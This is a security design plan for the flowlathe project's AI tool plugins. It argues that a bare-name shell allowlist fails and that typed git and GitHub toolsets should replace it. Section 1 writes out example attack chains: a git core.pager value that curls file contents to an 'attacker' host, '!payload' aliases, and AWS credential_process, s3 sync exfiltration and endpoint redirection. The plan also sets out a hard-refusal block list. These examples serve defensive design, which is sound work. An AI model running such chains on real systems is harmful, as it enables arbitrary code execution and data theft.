# PLAN-DOMAIN-TOOLS — domain toolsets instead of a generic shell, and why

Umbrella plan for `PLAN-GITHUB.md` and `PLAN-GIT.md`. Read this first; it holds the reasoning
both of those depend on and the one shared primitive they both consume (§7).

It also amends `PLAN-SHELL-TOOL.md` rather than replacing it — see §5 for exactly what changed
there and §6 for what a generic shell tool is still the only answer to.

---

## 1. Problem

`PLAN-SHELL-TOOL.md` is honest that its flag table is not the boundary. §4.1 step 5 says so
outright ("the flag table catches known shapes; the allowlist is the actual boundary"), and §7.1
repeats it ("an operator who allowlists an interpreter, a package manager, or `find` has granted
arbitrary local code execution").

What that plan never does is follow the consequence through to the commands an operator would
actually reach for. Both of the obvious ones are arbitrary code execution under its design, in
two calls, with no interpreter allowlisted and no blocked flag used.

### 1.1 `git` is not allowlistable

The plan's own table lists `git : -c, --exec-path, --upload-pack, --receive-pack` — all *flags*.
Nothing in the design constrains a *subcommand*. So:

```
shell_exec { command: "git", args: ["config", "core.pager", "sh -c 'curl attacker/$(cat …)'"] }
shell_exec { command: "git", args: ["log"] }
```

`git config` writes `.git/config`; the next `git` that pages runs the value through a shell.
`git config alias.x '!payload'` then `git x` is the same shape. Neither uses a flag on the
blocklist, neither contains a metacharacter in a position `validateCommandInvocation` inspects
(the metacharacters are inside a single argv element, which is exactly the case the existing doc
comment already says is not directly exploitable), and neither needs `sh` allowlisted.

Worse, `SHELL_TOOL_WORKDIR` + L4's `HOME = the resolved workdir` makes this **persist**. The
sandbox root is where the config lands, and the config is read back on the next call. The design's
containment feature is what gives the payload a home.

### 1.2 `aws` is not allowlistable

Structurally identical, via a different config file:

```
shell_exec { command: "aws", args: ["configure", "set", "credential_process", "<any command>"] }
shell_exec { command: "aws", args: ["sts", "get-caller-identity"] }
```

`credential_process` is a documented AWS CLI config key naming a command the CLI executes to
obtain credentials. Same two-call shape, same `HOME`-in-the-workdir persistence. And that is
before considering `--endpoint-url` (redirect any call to an attacker host), `aws s3 sync .
s3://attacker` (bulk exfiltration of the workdir), or `aws iam create-access-key` (privilege
escalation), none of which are flags any table would think to block.

### 1.3 The general class

Neither of these is a bug in `git` or `aws`. It is a class:

> **Any CLI with a persistent config file that can name a command to execute is not safe behind a
> bare-name allowlist, because writing that config is itself an allowlisted invocation.**

`git` (`core.pager`, `core.editor`, `alias.*` with `!`), `aws` (`credential_process`), `npm`
(`.npmrc` scripts-adjacent settings), `gh` (aliases), `docker` (already hard-blocked by
subcommand in the existing table, which is the only place the plan reaches for that mechanism)
all qualify. The flag table cannot see it because no flag is involved.

---

## 2. The prepared-statement principle

The SQL analogy that motivates this plan is precise about one layer and silent about the next.

`execFile(cmd, argv)` **is already a prepared statement for the shell parser.** That is
`PLAN-SHELL-TOOL.md`'s L1 and it is genuinely strong: pipes, redirection, globs, `&&` and
`$(…)` become structurally unrepresentable rather than filtered.

`execFile(cmd, argv)` is **not** a prepared statement for the *command's own argv parser*. Every
element of `argv` is re-parsed by the target program, which decides for itself which elements are
options, which are subcommands, and which are values. That is exactly the lesson
`packages/server/src/git-history.ts` already learned and encodes:

```ts
const SHA_PATTERN = /^[0-9a-fA-F]{4,40}$/;   // …before `git show <sha>:<path>`
```

with a doc comment saying `execFileSync` blocks shell injection but not argument injection.

A real prepared statement pushes the binding boundary down one more layer:

| Layer | Who authors it | Mechanism |
|---|---|---|
| Shell syntax | nobody — structurally absent | `execFile`, no `shell` option |
| Program, subcommand, every flag | the **plugin author**, at compile time | argv literals in the template |
| Values only | the **model**, at call time | typed, validated slots |

`PLAN-SHELL-TOOL.md` binds at the first layer and hands the model the second and third together.
That is the whole gap.

---

## 3. Three tiers of binding, ranked

**Tier A — no argv parser at all.** The vendor has an HTTP API; call it. There is no subcommand,
no flag, no config file, and no local process. The boundary is the credential's own scopes,
enforced by the vendor. This repo has five working instances (`spotify`, `discord`, `firecrawl`,
`searxng`, and the HTTP half of `mcp`) and every primitive they need already exists
(`httpGetJson`/`requestJson`/`guarded`/`toolOk`/`toolFail`/`CachedLivenessProbe`). **Always prefer
this when the vendor offers it.**

**Tier B — fixed argv template, typed value slots.** No API exists, or the operation is inherently
local. The plugin author writes the full argv except for named holes; each hole has a validator.
No subcommand and no flag is ever model-supplied. Cost: one tool per operation, and a real
subprocess with its own timeout/output/descendant-kill bounds.

**Tier C — bare-name allowlist + argument filtering.** `PLAN-SHELL-TOOL.md`. The only option when
the *operation itself* is not known in advance. Its boundary is operator judgment about which
commands are safe, and §1 shows that judgment is harder than the plan admits.

---

## 4. Decisions

| # | Decision | Why |
|---|---|---|
| D1 | **GitHub is Tier A: an HTTP client, not a `gh` subprocess.** `PLAN-GITHUB.md`. | GitHub has a complete REST API. Wrapping `gh` would add a process, an argv parser, an alias config file, and a second credential path, to reach the same endpoints. It also makes offline unit tests possible (an injected `fetchImpl`, as all four HTTP plugins already do) — a subprocess is not stubbable that way. |
| D2 | **Local git is Tier B: fixed argv templates with typed slots.** `PLAN-GIT.md`. | Local git has no API, so a subprocess is unavoidable — but its verb set is small and stable, and `git-history.ts` already demonstrates the exact pattern (fixed argv, `-C <root>`, one validated value slot). |
| D3 | **AWS gets no toolset in this plan — the boundary is IAM.** | AWS is ~400 services × dozens of operations; a prepared-statement wrapper enumerates a rounding error of it and never stops growing. More importantly IAM is a *strictly more expressive* boundary than any argv filter — action-, resource- and condition-level, enforced server-side, logged in CloudTrail. Scope the role the server runs under and the argv layer stops mattering. If tools are wanted later, make them thin `@aws-sdk/client-*` calls (typed parameters, no argv parser, no `credential_process`) — but the security work is the policy, not the tool shape. |
| D4 | **Auth and configuration are done by the operator, manually, outside flowlathe.** A token in an env var; `~/.gitconfig`, the credential helper and remotes already set up by hand. No plugin in this family performs an OAuth dance, writes a config file, stores a credential, or offers a Connect button. | Follows the SearXNG/Firecrawl/Discord precedent rather than Spotify's (CLAUDE.md's Phase D note already recorded that choice once, for Discord's bot token). It also removes the §1 attack class by construction: a plugin that never writes config cannot be used to write config. |
| D5 | **Both plans use a structural read/write mode**, defaulting to read-only, registering *zero* write tools in read-only mode. | `PLAN-FILE-TOOL.md`'s L2 reasoning verbatim: a registered-but-always-refusing tool still reaches the model in `tools` and invites calls that always fail (CLAUDE.md's "silently including a broken tool" note). |
| D6 | **Neither plan grows a node kind.** Toolsets only. | Same reasoning as both companion plans' L9 — the NodeKind checklist (`accessorExpr`, port names, DSL print/parse, Canvas views, golden fixtures) is separable work. |
| D7 | **`PLAN-SHELL-TOOL.md` is deferred, not cancelled**, and amended with §1's findings. | It remains the only answer to the open-ended case (§6). Its allowlist documentation was actively misleading and had to be fixed whether or not it is ever built. |

---

## 5. What changed in `PLAN-SHELL-TOOL.md`

Applied directly to that file, not left as a note here:

- A status banner at the top pointing at this plan, `PLAN-GIT.md` and `PLAN-GITHUB.md`, and
  saying it is deferred behind them.
- §1's motivating list no longer offers `git` as an example use.
- **A new locked decision L11**: `git`, `aws`, `gh`, `npm`, `docker` and the general
  config-file-names-a-command class are hard-refused at the allowlist check, exactly as
  `sudo`/`doas`/`su` already are — an operator cannot opt in via
  `SHELL_TOOL_ALLOWED_COMMANDS`.
- §4.1 step 5 gains the config-file class as a named third limit of the flag table, alongside
  `awk`'s first positional and `find -exec`.
- §5.1 gains test cases for the new hard-refusals.
- §7.1 gains the observation that `HOME = workdir` makes a written config *persist* across calls,
  which is what turns a one-shot write into a two-call execution primitive.
- §8, §10 and §11 gain the corresponding scope, CLAUDE.md and README items.

## 6. What this plan does not solve

`PLAN-SHELL-TOOL.md` §1's motivation is "run a test suite, invoke `git`, resize an image with
`ffmpeg`, or call a CLI that has no HTTP API." Two of those four are now covered. The other two
are not, and a prepared-statement toolset structurally cannot cover them: it exposes exactly the
verbs someone wrote down, and every N+1th verb is a code change and a release.

So the honest accounting is: **this is quicker and safer per tool, and it defers rather than
removes the open-ended case.** Deferring is the right call — the open-ended case has no safe
answer at Tier C without a real sandbox (`PLAN-SHELL-TOOL.md` §7.3's wrapper), and a real sandbox
is the operator's deployment decision, not a plugin's — but it is a deferral, and this file is
where that is recorded.

### 6.1 One option considered and deliberately not taken

A middle path exists and was rejected for v1, recorded here so it is not re-derived from scratch:
**one `command` plugin whose config is a set of operator-authored argv templates**, rather than a
bare-name allowlist.

```json
{ "name": "git_log", "argv": ["git", "log", "--oneline", "-n", "{count:int:1..200}", "{ref:refname}"] }
```

The operator authors the template (trusted at the same level as `MCP_SERVERS_CONFIG_PATH`
already is); the model binds slots; each slot names a validator from §7's vocabulary. That gets
the safety property of Tier B *and* extensibility without a code change per verb, and it makes
`DANGEROUS_FLAGS_BY_COMMAND` unnecessary because no flag is ever model-supplied.

Not built now because it needs a slot mini-language, its own config-file loader and validation
pass, and a `/api/plugins/status` story for a dynamic tool list — while `git` and `github`,
the two concrete consumers, are better served at Tier A/B anyway. Revisit if a *third* domain
appears whose verbs are stable but whose plugin nobody wants to write.

---

## 7. The one shared primitive: `slot-safety.ts`

Both `PLAN-GIT.md` and `PLAN-GITHUB.md` need "validate one model-supplied value before it reaches
an argv element or a URL path segment." It must exist exactly once. Its home is
`@flowlathe/plugin-common` for the same reason `path-safety.ts`'s is (`PLAN-SHELL-TOOL.md` §9.1):
Node-only by construction, already a dependency of every plugin, and **not** `@flowlathe/core`,
which must stay isomorphic.

```ts
// packages/plugins/_common/src/slot-safety.ts
export class SlotError extends Error {}

/** A git ref: branch, tag, or sha. Slashes allowed (`feature/x`); everything that makes a ref
 *  dangerous in an argv or a URL path is not. */
export function gitRefSlot(value: string, label: string): string;

/** `owner/name`. Exactly one separator; each half is a bare segment. */
export function repoSlugSlot(value: string, label: string): { owner: string; name: string; slug: string };

/** An integer clamped into [min, max]. Distinct from `clampLimit` (which silently falls back);
 *  this one throws, because a slot that cannot be validated must not become a default. */
export function intSlot(value: unknown, label: string, min: number, max: number): number;

/** Free text destined for a commit message / issue body / comment: rejects NUL and control
 *  characters other than \n and \t, bounds length, and rejects a leading "-" so it can never be
 *  mistaken for an option if it ever reaches an argv position. */
export function textSlot(value: unknown, label: string, maxLength: number): string;
```

Rules every validator shares, and the reasons each one exists in this repo's own history:

1. **Reject NUL, always.** Already the rule in `plugin-mcp`'s `validateEnvValues`.
2. **Reject a leading `-`.** This is the `git-history.ts` bug (CLAUDE.md's HANDOFF-QUICK-FIXES
   note): `execFile` blocks shell injection but a `-`-prefixed *value* is parsed as an *option*.
   Unlike `PLAN-SHELL-TOOL.md` §4.1 step 4 — which correctly declines a blanket no-leading-dash
   rule because *there* every argv element is caller-authored — here there **is** a
   template/value boundary, which is precisely the shape that rule protects. The two plans
   disagree on this deliberately; both are right for their own design.
3. **Reject any `..` path component, and reject `/` where a single segment is expected.** This is
   the `DiscordClient.react` bug (same CLAUDE.md note): undici normalizes `..` during URL parsing,
   so a `messageId` containing `/../` silently retargets the request at a different API endpoint —
   with no filesystem involved. Any value reaching a URL path segment needs this.
4. **Throw `SlotError`, never return a fallback.** A caller turns it into `toolFail(err.message)`
   at the top of the handler, the same shape `requireString`/`PluginArgError` already has.

Ownership: whichever of `PLAN-GIT.md` / `PLAN-GITHUB.md` lands first creates the module and its
tests; the second consumes it and adds only the validators it needs that are missing.

---

## 8. Effect on the other plans

- **`PLAN-TOOL-APPROVAL.md`.** The approval gate gets meaningfully more useful, and its §7
  deferral of per-tool-name gating stops being right. Approving `git_commit(message)` is a
  bounded decision a human can actually make; approving `shell_exec({command, args})` asks an
  operator to perform an ad hoc security review, repeatedly, under time pressure — which is how
  approval fatigue produces rubber-stamping. And with a domain toolset the useful grain is
  obviously per-tool: gate `git_push` and `github_create_pull_request`, not `git_status`. That
  plan's §7 has been amended accordingly.
- **`PLAN-FILE-TOOL.md`.** Its half of `PLAN-SHELL-TOOL.md` §9.2's write-then-execute threat
  largely evaporates for this family: no prepared-statement toolset lets a model name a binary to
  run, so there is nothing for a written file to be executed *by*. The threat returns in full if
  the shell tool is ever built. `path-safety.ts` remains shared exactly as §9.1 specifies —
  `PLAN-GIT.md` is now a third consumer.
- **`PLAN-SANITIZATION-BOUNDARY.md`.** Unchanged and fully load-bearing. Both new plans handle
  text that is authorable by third parties — a commit message, an issue body, a PR comment from
  any GitHub user — which is a *sharper* injection surface than search results, because it is
  attacker-authored on purpose rather than incidentally. Layer 1 per-field sanitization is
  mandatory in both.

---

## 9. Ordering across the family

1. **`PLAN-GITHUB.md`** first. Highest value, lowest risk, zero new primitives beyond
   `slot-safety.ts`, five existing precedents to copy, and entirely offline-testable.
2. **`PLAN-GIT.md`** second. Consumes `slot-safety.ts` and adds `exec.ts`/`path-safety.ts` to
   `plugin-common` — the two primitives `PLAN-SHELL-TOOL.md` would later inherit rather than
   author.
3. **`PLAN-TOOL-APPROVAL.md`** third, if wanted — it is more compelling once there are bounded
   tools to gate, and its per-tool-name grain (§8) should land with it rather than after.
4. **`PLAN-SHELL-TOOL.md`** last, if ever, and only with `SHELL_TOOL_WRAPPER` (§7.3) treated as
   required rather than optional.

---

## 10. Notes to record (definition of done for this plan)

Add these to **`documentation/notes/security.md`** — they are security lessons about why a
command allowlist is not a boundary, not plugin conventions. `CLAUDE.md` is now an index plus
repo-wide invariants only. Write the surprise, not the summary:

- **A bare-name command allowlist is not a boundary for any CLI that has a config file naming a
  command to execute.** `git config core.pager …` then `git log`, or `aws configure set
  credential_process …` then any `aws` call, is arbitrary execution in two allowlisted calls with
  no blocked flag and no interpreter allowlisted — and `SHELL_TOOL_WORKDIR` + `HOME = workdir`
  is what makes the written config persist between them. This is why `git`/`aws`/`gh`/`npm` are
  hard-refused in `PLAN-SHELL-TOOL.md`'s L11 and why `git` and GitHub are domain plugins instead.
- **`execFile` is a prepared statement for the *shell* parser only, never for the command's own
  argv parser** — the program still decides which elements are options. The leading-dash rule
  belongs wherever there is a template/value boundary (`slot-safety.ts`, `git-history.ts`) and is
  correctly *absent* where there is not (`PLAN-SHELL-TOOL.md` §4.1 step 4). Both positions are
  deliberate; don't "unify" them.
- **AWS deliberately has no toolset.** IAM is a strictly more expressive boundary than any argv
  filter and is enforced server-side; a prepared-statement CLI wrapper would be unbounded
  enumeration behind a weaker guard. Don't file this as a missing integration.
